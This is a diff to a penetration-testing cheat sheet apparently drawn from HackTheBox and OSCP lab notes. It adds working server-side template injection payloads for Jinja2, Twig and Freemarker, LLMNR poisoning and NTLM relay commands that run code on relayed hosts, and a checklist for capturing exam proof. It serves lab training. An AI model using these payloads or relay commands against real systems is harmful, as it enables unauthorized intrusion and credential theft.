@@ -19,6 +19,7 @@ Extracted from all `notes.md` / `report.md` files under `boxes/htb/`, `boxes/pro
 9. Active Directory
 10. Password Cracking
 11. Post-Exploitation / Persistence / Pivoting
+12. Proof Collection
 
 ---
 
@@ -310,6 +311,35 @@ curl -s -X POST \
   'http://<target>:8888/<service>/soap11/checkout' | xmllint --format -
 ```
 SOAP/XML XXE against a Ladon service to read arbitrary local files (`/etc/passwd`, WebDAV credential files). (Muddy)
+
+### SSTI (Server-Side Template Injection)
+```
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+```
+Probe every input reflected into a page with these — a `49` back (instead of literal text) confirms SSTI and fingerprints the engine (Jinja2/Twig/Freemarker/ERB/Velocity respectively). One of the most common OSCP-lab web footholds; check any field that echoes back user input (search, name, comment).
+
+```
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{% endif %}{% endfor %}
+```
+Jinja2 RCE (Flask) — walk Python's object graph from a builtin to `os.popen`; the `subclasses()` variant is the fallback when `config`/`self` aren't in scope.
+
+```
+{{['id']|filter('system')}}
+{{['id','']|filter('shell_exec')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+Twig RCE (PHP) — abuse a filter that resolves to a PHP function name (`system`/`shell_exec`) and calls it with the array as args.
+
+```
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+Freemarker/Spring SpEL RCE — invokes `Runtime.exec` directly via a Spring Expression Language sink.
 
 ### XPATH Injection
 ```
@@ -997,6 +1027,29 @@ netexec ldap <dc_ip> -u '<user>' -p '<pass>' --users | fgrep -v '[' | fgrep -vi 
 ```
 Pull the full domain username list over LDAP with valid creds, stripped down to a plain wordlist for spraying. (ADChain_01)
 
+### LLMNR/NBT-NS Poisoning & NTLM Relay
+
+```sh
+sudo responder -I <interface> -dPv
+```
+Poison LLMNR/NBT-NS/MDNS broadcast name resolution — captures NetNTLMv2 hashes from any host that mistypes a share name or has a stale DNS entry, zero creds needed. Often the fastest first foothold on an AD network. Crack the captured hash with `hashcat -m 5600`.
+
+```sh
+netexec smb <ip_range> --gen-relay-list relay_targets.txt
+```
+Before relaying, confirm which hosts have SMB signing disabled (`netexec smb` already flags `signing:False` in its normal output) — relay only works against non-signing targets.
+
+```sh
+sudo responder -I <interface> -dPv --lm   # in a separate terminal, disable Responder's own SMB/HTTP servers via config first
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+```
+Relay captured NTLM auth to hosts with SMB signing off instead of cracking the hash — `ntlmrelayx` needs Responder's SMB server disabled in `Responder.conf` first (both can't bind port 445). Successful relay to a signing-disabled host with local admin rights gives an immediate SAM dump or shell.
+
+```sh
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'whoami'
+```
+Relay straight to command execution instead of just a SAM dump, once you've confirmed the relayed account has admin rights on the target.
+
 ### GPP / Credential Extraction
 ```sh
 gpp-decrypt '<cpassword value from Groups.xml>'
@@ -1384,4 +1437,27 @@ RDP back in as a newly-created/escalated user to collect further loot or pivot f
 net localgroup "administrators" <domain_user> /add
 ```
 Once RDP'd in as a local admin (e.g. via a cracked local-account password), add your existing domain account to the local Administrators group — instantly gives that domain account admin-equivalent SMB/WinRM access to the box for further dumping. (ADChain_01)
+
+---
+
+## 12. Proof Collection
+
+Run this on every root/SYSTEM shell the moment it lands — a missing or malformed proof is a zero-point machine no matter how good the exploit chain was.
+
+```sh
+hostname && whoami && cat /proof.txt
+ifconfig || ip a
+```
+Linux root proof — `hostname`+`whoami`+`cat proof.txt` must all appear together in one screenshot/terminal capture, plus network interface output showing the lab-assigned IP.
+
+```cmd
+hostname && whoami && type C:\Users\Administrator\Desktop\proof.txt
+ipconfig /all
+```
+Windows SYSTEM/Administrator proof — same rule: `hostname`, `whoami`, and the `type`'d proof.txt contents in one shot, plus `ipconfig /all`.
+
+- Capture proof **immediately** on privesc — don't chain further actions first; a session can die before you screenshot.
+- Screenshot must show the full terminal/shell (prompt, command, output) — cropped or partial captures get rejected.
+- Local vs domain admin on AD boxes: grab proof on **every** machine compromised (DCs and non-DC members each need their own local.txt/proof.txt), not just the DC.
+- Keep raw command output in notes.md alongside the screenshot — the report needs both the image and the pasted text.
 
